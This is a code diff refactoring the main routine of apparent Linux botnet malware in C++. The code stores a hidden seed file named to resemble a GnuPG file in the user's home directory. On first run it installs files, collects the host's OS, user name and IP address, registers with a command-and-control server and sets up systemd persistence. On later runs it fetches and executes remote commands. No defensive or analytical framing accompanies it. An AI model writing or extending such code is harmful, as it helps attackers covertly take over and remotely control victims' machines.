@@ -12,39 +12,33 @@ const std::string SEED_FILE = ".seed_gnupg~";
 
 int main()
 {
+    c2::Bot host;
     std::string homeDir, seedPath;
 
     homeDir = std::getenv("HOME");
     seedPath = homeDir + "/" + SEED_DIR + "/" + SEED_FILE;
 
-    seed::Seed botSeed(seedPath);
+    seed::Seed hostSeed(seedPath);
 
-    if ( botSeed.exists() ) {
-        std::string hashSum, ipAddr, postForm, cmd;
+    if ( hostSeed.exists() ) {
 
-        botSeed.getSeed();
+        hostSeed.getSeed();
 
-        hashSum = botSeed.getHash();
-        ipAddr = getIPAddr();
-
-        postForm = c2::getCmdParams(hashSum, ipAddr);
-        cmd = c2::getCmd(postForm);
-        c2::runCmd(cmd);
+        host.hashSum = hostSeed.getHash();
+        host.ipAddr = getIPAddr();
+        host.executeOrder();
 
     } else {
         install::installFiles();
 
-        std::string hashSum, os, user, ipAddr, postForm;
+        hostSeed.initSeed();
 
-        botSeed.initSeed();
+        host.hashSum = hostSeed.getHash();
+        host.os = getOS();
+        host.user = getUser();
+        host.ipAddr = getIPAddr();
 
-        hashSum = botSeed.getHash();
-        os = getOS();
-        user = getUser();
-        ipAddr = getIPAddr();
-
-        postForm = c2::getRegParams(hashSum, os, user, ipAddr);
-        c2::registerBot(postForm);
+        host.registerBot();
 
         install::initSystemd();
     }
